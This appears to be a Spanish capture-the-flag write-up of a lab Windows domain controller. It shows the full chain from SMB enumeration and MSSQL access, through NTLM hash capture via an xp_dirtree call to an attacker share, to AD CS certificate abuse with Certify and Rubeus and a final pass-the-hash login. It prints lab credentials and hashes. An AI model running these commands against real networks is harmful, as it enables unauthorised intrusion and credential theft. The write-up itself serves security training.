Hacemos el escaneo con nmap:
![[Pasted image 20240603104629.png]]
Encontramos el nombre de dominio sequel.htb:
![[Pasted image 20240603104713.png]]
Miramos a ver si hay algún recurso compartido accesible:
```bash
smbmap -H 10.10.11.202 -u 'null' -p ''
```
![[Pasted image 20240603104842.png]]
Dentro del recurso compartido public, nos encontramos con un documento .pdf, por lo que nos lo descargamos:
```bash
smbmap -H 10.10.11.202 -u 'null' -p '' --download Public/"SQL Server Procedures.pdf"
```
![[Pasted image 20240603104935.png]]
Y dentro del documento vemos unas credenciales:
```bash
PublicUser:GuestUserCantWrite1
```
![[Pasted image 20240603105027.png]]
En el puerto 1433 vimos que está corriendo una base de datos SQL Server, por lo que nos conectamos con impacket-mssqlclient:
```bash
impacket-mssqlclient publicuser:GuestUserCantWrite1@10.10.11.202
```
![[Pasted image 20240603105241.png]]
Una vez dentro de esta base de datos, podemos conectarnos a nuestro equipo atacante escuchando con el responder, para así recibir el hash NTLMv2 del usuario:
```python
responder -I tun0
```
![[Pasted image 20240603105926.png]]
Este comando listará el contenido del recurso compartido 10.10.16.4/share incluyendo archivos y directorios. 1 significa que solo se listará el contenido del directorio especificado:
```bash
EXEC xp_dirtree '\\10.10.16.4\share', 1, 1
```
![[Pasted image 20240603105943.png]]
Y abremos recibido el hash:
![[Pasted image 20240603105956.png]]
Este hash lo vamos a copiar dentro de un archivo llamado hash y lo vamos a crackear:
```bash
sql_svc:REGGIE1234ronnie
```
![[Pasted image 20240603110159.png]]
Iniciamos sesión con evil-winrm ya que el puerto 5985 de winrm estaba abierto:
```bash
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```
![[Pasted image 20240603110443.png]]
Una vez dentro, vamos a mirar los logs de inicio de sesión de la base de datos, los cuales se encuentran en esta ruta:
```bash
C:\SQLServer\Logs
```
![[Pasted image 20240603110719.png]]
Y al final del todo, vemos unos intentos de inicio de sesión fallidos, donde parece ser que el usuario Ryan ha puesto la contraseña en el campo del usuario por error:
```bash
Ryan.Cooper:NuclearMosquito3
```
![[Pasted image 20240603110828.png]]
Por lo que entramos con estas credenciales por winrm:
```bash
evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3
```
![[Pasted image 20240603110928.png]]
Para la escalada de privilegios, utilizaremos certify, donde podemos identificar plantillas de certificados y políticas que puedan ser explotadas.

AD CS es una tecnología de Microsoft que permite emitir certificados digitales para proteger comunicaciones y datos en una red. Sin embargo, si no está configurado correctamente, puede ser explotado para obtener acceso no autorizado.

Por lo que lo subimos la herramienta para explotar esto:
```bash
https://github.com/GhostPack/Certify
```
![[Pasted image 20240603111130.png]]
El ejecutable nos lo bajamos desde aquí:
```bash
https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any
```
![[Pasted image 20240603111422.png]]
Una vez que lo tengamos lo subimos a la máquina víctima:
```bash
upload Certify.exe
```
![[Pasted image 20240603111543.png]]
Y una vez subido, vamos a enumerar el usuario actual:
```bash
.\Certify.exe find /vulnerable /currentuser
```
![[Pasted image 20240603111634.png]]
Y se nos indica de un certificado vulnerable. El template UserAuthentication es vulnerable ya que permite derechos de enrollment a todos los usuarios del dominio.
![[Pasted image 20240603111901.png]]
En la propia página de github se nos da unas instrucciones de qué comando ejecutar:
![[Pasted image 20240603112051.png]]
Por lo que solicitamos el certificado como Administrador al certificado llamado UserAuthentication:
```bash
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
![[Pasted image 20240603112125.png]]
Todas estas claves vamos a guardarlas en un archivo llamado cert.pem:
![[Pasted image 20240603112358.png]]
Y convertimos este archivo:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
![[Pasted image 20240603112421.png]]
Ahora, para conseguir el hash NTLM del administrador usando el cert.pfx, tenemos que subirlo y ejecutarlo con rubeus, el cual podremos descargarlo desde el siguiente enlace:
```bash
https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe
```
Lo subimos a la máquina víctima:
```bash
upload Rubeus.exe
upload cert.pfx
```
![[Pasted image 20240603112758.png]]
Con rubeus vamos a ejecutar el siguiente comando para obtener generar un TGT y así obtener el hash del usuario administrador:
```bash
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
![[Pasted image 20240603113211.png]]
Y vemos el hash NTLM del usuario administrador:
```bash
A52F78E4C751E5F5E17E1E9F3E58F4EE
```
![[Pasted image 20240603113245.png]]
Y con este comando podemos iniciar sesión con el usuario administrador explotando un pass the hash:
```bash
evil-winrm -i 10.10.11.202 -u Administrator -H "A52F78E4C751E5F5E17E1E9F3E58F4EE"
```
![[Pasted image 20240603113351.png]]
